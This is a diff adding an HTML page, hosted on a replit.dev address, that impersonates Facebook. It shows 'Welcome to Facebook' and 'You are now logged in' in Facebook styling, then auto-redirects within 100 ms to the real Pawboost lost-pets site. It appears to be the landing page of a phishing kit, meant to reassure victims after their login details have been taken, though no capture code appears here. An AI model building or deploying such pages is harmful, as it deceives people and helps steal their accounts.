@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <link rel="icon" type="image/png" href="https://ea922165-4a00-4a42-83a7-2ac105bdc130-00-1yqnbhwquay4.picard.replit.dev/pawboost.png" />
+
+  <title>Follow our page - Pawboost Community Find Lost Pets</title>
+  <link rel="stylesheet" href="style.css"> <!-- Optional: your external CSS -->
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .login-container {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 400px;
+    }
+    h2 {
+      color: #1877f2;
+      margin-bottom: 20px;
+    }
+    p {
+      color: #606770;
+      margin-bottom: 20px;
+    }
+    a {
+      color: #1877f2;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    button {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background-color: #165fc1;
+    }
+  </style>
+
+  <!-- Auto redirect after 1 second -->
+  <script>
+    window.onload = function() {
+      setTimeout(function() {
+        window.location.href = "https://www.pawboost.com/lost-found-pets/index?LfdbFeedStatusForm%5Bzip%5D=20151";
+      }, 100);
+    };
+  </script>
+</head>
+<body>
+  <div class="login-container">
+    <h2>Welcome to Facebook</h2>
+    <p>You are now logged in.</p>
+
+    <!-- Facebook group link -->
+    <p>
+      Visit our group:
+      <a href="https://www.facebook.com/groups/569116587524527/" target="_blank">
+        Facebook Group
+      </a>
+    </p>
+
+    <button onclick="logoutUser()">Log Out</button>
+  </div>
+</body>
+</html>
